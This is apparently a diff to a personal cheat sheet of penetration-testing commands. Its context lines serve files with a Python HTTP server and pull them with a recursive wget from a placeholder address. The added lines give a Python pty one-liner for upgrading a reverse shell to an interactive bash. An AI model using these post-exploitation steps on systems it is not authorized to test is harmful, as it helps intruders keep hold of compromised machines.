@@ -3,5 +3,7 @@ python -m http.server <port>
 wget -r http://<ip address>:<port>
 
 
+# update reverse shell 
+python -c 'import pty; pty.spawn("/bin/bash")'  
 
 
